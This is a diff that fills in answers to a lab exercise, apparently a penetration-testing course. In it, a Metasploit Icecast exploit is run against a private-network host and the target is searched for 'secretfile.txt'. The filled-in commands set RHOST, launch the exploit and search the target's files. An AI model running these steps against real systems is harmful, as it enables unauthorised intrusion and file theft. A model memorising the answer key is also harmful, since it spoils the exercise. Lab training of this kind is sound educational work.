@@ -92,17 +92,17 @@ You've been provided full access to the network and are getting ping responses f
  
    - Run the command that sets the `RHOST`:
       
-     > Answer: 
+     > Answer: set RHOST 192.168.0.20
  
 6. Run the Icecast exploit.
  
    - Run the command that runs the Icecast exploit.
       
-     > Answer: 
+     > Answer: exploit
  
    - Run the command that performs a search for the `secretfile.txt` on the target.
       
-     > Answer: 
+     > Answer: dir *secretfile*.txt /s /p
   
  7. You should now have a Meterpreter session open.
  
